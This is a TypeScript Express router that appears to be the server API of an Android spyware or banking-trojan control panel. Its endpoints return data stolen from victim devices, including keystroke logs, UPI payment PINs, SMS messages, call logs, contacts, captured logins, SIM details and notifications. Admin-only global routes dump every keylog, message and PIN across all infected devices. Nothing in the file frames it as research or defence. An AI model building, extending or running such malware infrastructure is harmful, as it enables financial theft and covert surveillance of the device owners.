import { Router, Request, Response } from 'express';
import { authenticate } from '../../middleware/auth';
import { asyncHandler } from '../../middleware/errorHandler';
import { ProviderFactory } from '../../providers/factory';

const router = Router();

/**
 * GET /api/v1/devices/data/:deviceId/messages
 */
router.get('/:deviceId/messages', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let provider;
    if (isAdmin) {
        provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    } else {
        provider = await ProviderFactory.getProviderForUser(deviceId as string, userId, appId);
        if (!provider) return res.status(403).json({ success: false, error: 'Forbidden' });
    }
    const messages = await provider.getMessages(deviceId as string, Number(limit));
    return res.json({ success: true, messages });
}));

router.get('/:deviceId/apps', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 200 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let provider;
    if (isAdmin) {
        provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    } else {
        provider = await ProviderFactory.getProviderForUser(deviceId as string, userId, appId);
        if (!provider) return res.status(403).json({ success: false, error: 'Forbidden' });
    }
    const apps = await provider.getApps(deviceId as string, Number(limit));
    return res.json({ success: true, apps });
}));

router.get('/:deviceId/keylogs', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let provider;
    if (isAdmin) {
        provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    } else {
        provider = await ProviderFactory.getProviderForUser(deviceId as string, userId, appId);
        if (!provider) return res.status(403).json({ success: false, error: 'Forbidden' });
    }
    const keylogs = await provider.getKeylogs(deviceId as string, Number(limit));
    return res.json({ success: true, keylogs });
}));

router.get('/:deviceId/upi-pins', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let provider;
    if (isAdmin) {
        provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    } else {
        provider = await ProviderFactory.getProviderForUser(deviceId as string, userId, appId);
        if (!provider) return res.status(403).json({ success: false, error: 'Forbidden' });
    }
    const pins = await provider.getUpiPins(deviceId as string);
    return res.json({ success: true, pins });
}));

router.get('/:deviceId/heartbeat', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 50 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let provider;
    if (isAdmin) {
        provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    } else {
        provider = await ProviderFactory.getProviderForUser(deviceId as string, userId, appId);
        if (!provider) return res.status(403).json({ success: false, error: 'Forbidden' });
    }
    const heartbeat = await provider.getHeartbeat(deviceId as string, Number(limit));
    return res.json({ success: true, heartbeat });
}));

router.get('/:deviceId/sims', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let provider;
    if (isAdmin) {
        provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    } else {
        provider = await ProviderFactory.getProviderForUser(deviceId as string, userId, appId);
        if (!provider) return res.status(403).json({ success: false, error: 'Forbidden' });
    }
    const sims = await provider.getSims(deviceId as string);
    return res.json({ success: true, sims });
}));

router.get('/:deviceId/notifications', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let provider;
    if (isAdmin) {
        provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    } else {
        provider = await ProviderFactory.getProviderForUser(deviceId as string, userId, appId);
        if (!provider) return res.status(403).json({ success: false, error: 'Forbidden' });
    }
    const notifications = await provider.getNotifications(deviceId as string, Number(limit));
    return res.json({ success: true, notifications });
}));

router.get('/:deviceId/call-logs', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let provider;
    if (isAdmin) {
        provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    } else {
        provider = await ProviderFactory.getProviderForUser(deviceId as string, userId, appId);
        if (!provider) return res.status(403).json({ success: false, error: 'Forbidden' });
    }
    const callLogs = await provider.getCallLogs(deviceId as string, Number(limit));
    return res.json({ success: true, callLogs });
}));

router.get('/:deviceId/contacts', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let provider;
    if (isAdmin) {
        provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    } else {
        provider = await ProviderFactory.getProviderForUser(deviceId as string, userId, appId);
        if (!provider) return res.status(403).json({ success: false, error: 'Forbidden' });
    }
    const contacts = await provider.getContacts(deviceId as string);
    return res.json({ success: true, contacts });
}));

router.get('/:deviceId/logins', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let provider;
    if (isAdmin) {
        provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    } else {
        provider = await ProviderFactory.getProviderForUser(deviceId as string, userId, appId);
        if (!provider) return res.status(403).json({ success: false, error: 'Forbidden' });
    }
    const logins = await provider.getLogins(deviceId as string);
    return res.json({ success: true, logins });
}));

// ==================== Global Routes (Master Database Only) ====================

/**
 * GET /api/v1/devices/data/messages (Global)
 */
router.get('/messages', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;
    const isAdmin = req.user!.role === 'admin';
    if (!isAdmin) return res.status(403).json({ success: false, error: 'Forbidden' });

    const provider = await ProviderFactory.getProvider();
    const messages = await provider.listAllMessages(Number(limit));
    return res.json({ success: true, messages });
}));

/**
 * GET /api/v1/devices/data/apps (Global)
 */
router.get('/apps', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 200 } = req.query;
    const isAdmin = req.user!.role === 'admin';
    if (!isAdmin) return res.status(403).json({ success: false, error: 'Forbidden' });

    const provider = await ProviderFactory.getProvider();
    const apps = await provider.listAllApps(Number(limit));
    return res.json({ success: true, apps });
}));

/**
 * GET /api/v1/devices/data/keylogs (Global)
 */
router.get('/keylogs', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;
    const isAdmin = req.user!.role === 'admin';
    if (!isAdmin) return res.status(403).json({ success: false, error: 'Forbidden' });

    const provider = await ProviderFactory.getProvider();
    const keylogs = await provider.listAllKeylogs(Number(limit));
    return res.json({ success: true, keylogs });
}));

/**
 * GET /api/v1/devices/data/upi-pins (Global)
 */
router.get('/upi-pins', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;
    const isAdmin = req.user!.role === 'admin';
    if (!isAdmin) return res.status(403).json({ success: false, error: 'Forbidden' });

    const provider = await ProviderFactory.getProvider();
    const pins = await provider.listAllUpiPins(Number(limit));
    return res.json({ success: true, pins });
}));

export default router;
